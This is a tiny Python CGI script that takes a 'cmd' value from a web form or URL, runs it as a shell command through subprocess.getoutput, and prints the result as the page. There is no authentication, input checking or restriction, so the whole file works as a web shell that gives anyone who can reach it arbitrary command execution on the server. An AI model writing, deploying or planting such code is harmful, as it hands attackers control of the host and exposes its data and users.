#! /usr/bin/python3

print("content-type: text/html \n")

import cgi

form = cgi.FieldStorage()
command = form.getvalue("cmd")

import subprocess 

x = subprocess.getoutput(command)
print(x)
